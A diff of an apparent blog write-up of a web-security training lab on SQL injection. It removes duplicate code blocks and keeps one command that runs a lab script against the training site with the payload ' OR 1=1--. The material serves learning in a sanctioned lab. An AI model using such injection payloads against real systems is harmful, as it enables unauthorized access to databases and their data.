@@ -131,48 +131,10 @@ else:
 
 To test our script with the Lab's temporary URL and the payload we initially tested (`' OR 1=1--`), you can use the following command:
 
-```python
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-```zsh
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-
-```shell
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-
-```sh
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-
-```console
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-
-```bash
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-
 ```powershell
 > python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
 ```
 
-```ps
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-
-```dos
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-
-```bat
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
-
-```cmd
-> python3 sqli-lab01.py https://0a9d00e603476b2480e1766400eb00da.web-security-academy.net "' or 1=1--"
-```
 
 et voilà! [Little bobby tables](https://xkcd.com/327/){:target="_blank"} would be very happy :-) 
 
